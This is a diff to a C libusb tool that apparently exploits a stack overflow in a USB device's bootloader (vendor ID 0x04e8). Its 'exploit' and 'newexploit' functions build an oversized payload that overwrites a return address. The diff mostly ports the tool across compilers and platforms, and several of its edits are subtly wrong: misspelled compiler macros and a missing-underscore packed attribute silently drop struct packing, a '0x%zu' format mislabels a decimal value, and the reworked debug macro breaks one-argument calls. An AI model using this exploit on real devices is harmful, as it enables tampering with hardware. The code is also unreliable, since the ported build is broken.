@@ -7,20 +7,28 @@
 #include <stdint.h>
 #include <string.h>
 #include <assert.h>
-#include "libusb-1.0/libusb.h"
+#include <stdbool.h>
+#include "libusb.h"
 
+#ifdef _POSIX_C_SOURCE
 #include <unistd.h>
+#endif
 
+#ifdef NDEBUG
 #define DEBUG	0
+#else
+#define DEBUG   1
+#endif
+
 #define VENDOR_ID	0x04e8
 #define PRODUCT_ID	0x1234
 #define BLOCK_SIZE		512
 #define CHUNK_SIZE	(uint32_t)0xfffe00
 
 #if DEBUG
-#define dprint(args...) printf(args)
+#define dprint(args, ...) printf(args, __VA_ARGS__)
 #else
-#define dprint(args...)
+#define dprint(args, ...)
 #endif
 
 enum {
@@ -123,17 +131,36 @@ static target_data targets[] = {
 libusb_device_handle *handle = NULL;
 
 #define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)
-typedef struct __attribute__ ((__packed__)) dldata_s {
-	u_int32_t unk0;
-	u_int32_t size;// header(8) + data(n) + footer(2)
-	u_int8_t data[];
+
+#if defined(_MSC_VER)
+#  define PACKED_BEGIN __pragma(pack(push, 1))
+#  define PACKED_END   __pragma(pack(pop))
+#  define PACKED
+#elif defined(GNUC) || defined(clang)
+#  define PACKED_BEGIN
+#  define PACKED_END
+#  define PACKED attribute((packed))
+#else
+#  define PACKED_BEGIN
+#  define PACKED_END
+#  define PACKED
+#endif
+
+PACKED_BEGIN
+
+typedef struct PACKED dldata_s {
+	uint32_t unk0;
+	uint32_t size;// header(8) + data(n) + footer(2)
+	uint8_t data[];
 	//u_int16_t footer;
 } dldata_t;
 
+PACKED_END
+
 static int newexploit(dldata_t *payload, int target_id) {
 	int rc;
-	int transferred;
-	uint total_size = payload->size;
+	uint32_t transferred;
+	uint32_t total_size = payload->size;
 	uint8_t *payload_ptr = (uint8_t *)payload;
 	get_conf_data* target_data = &targets[target_id].get_conf_data;
 	unsigned char response[512];
@@ -166,10 +193,10 @@ static int newexploit(dldata_t *payload, int target_id) {
 	return rc;
 }
 
-static int send(dldata_t *payload) {
+static int send_payload(dldata_t *payload) {
 	int rc;
 	int transferred;
-	uint total_size = payload->size;
+	uint32_t total_size = payload->size;
 	uint8_t *payload_ptr = (uint8_t *)payload;
 
 	do {
@@ -234,6 +261,9 @@ static int exploit(dldata_t *payload, int target_id) {
 
 	// step 2 : prepare payload
 	uint8_t *ram = (uint8_t*)calloc(1, ram_size);
+	if (ram == NULL) {
+		return -1;
+	}
 	*(uint32_t*)&ram[padding_size] = targets[target_id].bulk_exploit_data[XFER_BUFFER];//overwriting return address in stack :]
 	payload->size = original_payload_size + (CHUNK_SIZE * chunk_cnt) + (BLOCK_SIZE * block_cnt) + ram_size;
 	dprint("malicious payload->size=0x%x\n", payload->size);
@@ -365,6 +395,14 @@ static int save_received_data(const char *filename){
 	return total_transferred;
 }
 
+void my_sleep(int secs) {
+#ifdef _WIN32
+	Sleep(secs * 1000);
+#else
+	sleep(secs);
+#endif
+}
+
 int main(int argc, char *argv[])
 {
 	libusb_context *ctx;
@@ -465,13 +503,13 @@ int main(int argc, char *argv[])
 	}else if (mode == NEWEXPLOIT_MODE){
 		target_id = identify_target();
 		if (targets[target_id].supports_get_configuration_exploit) {
-			printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
+			printf("Sending file %s (0x%zu)...\n", argv[2], fd_size);
 			rc = newexploit(payload, target_id);
 			if(!rc)
 				printf("File %s sent !\n", argv[2]);
 
 			if(argv[3]){
-				sleep(2);
+				my_sleep(2);
 				handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
 				rc = libusb_claim_interface(handle, 0);
 				rc = save_received_data(argv[3]);
@@ -483,8 +521,8 @@ int main(int argc, char *argv[])
 			fprintf(stderr, "This device does not support the get configuration exploit!\n");
 		}
 	}else{// NORMAL_MODE
-		printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
-		rc = send(payload);
+		printf("Sending file %s (0x%zu)...\n", argv[2], fd_size);
+		rc = send_payload(payload);
 		if(!rc)
 			printf("File %s sent !\n", argv[2]);
 
@@ -496,7 +534,7 @@ int main(int argc, char *argv[])
 		}
 	}
 	#if DEBUG
-	sleep(5);
+	my_sleep(5);
 	#endif
 	libusb_release_interface(handle, 0);
 
